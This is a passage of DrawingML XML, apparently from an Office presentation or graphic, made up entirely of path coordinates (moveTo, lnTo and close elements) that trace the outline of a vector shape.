                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="8620"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8621" y="10088"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9355" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="10088"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6860" y="11555"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7190" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="11555"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8328" y="11262"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8474" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="12325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="11262"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6970" y="2678"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7374" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8915" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8108" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7301" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7411" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5687" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="12325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="12802"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="12765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="12325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4403" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4403" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="12435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="12802"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="12765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="12545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4073" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="12435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="12435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1285" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1175" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="955" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1652" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1652" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1652" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="2788"/>
                  </a:lnTo>
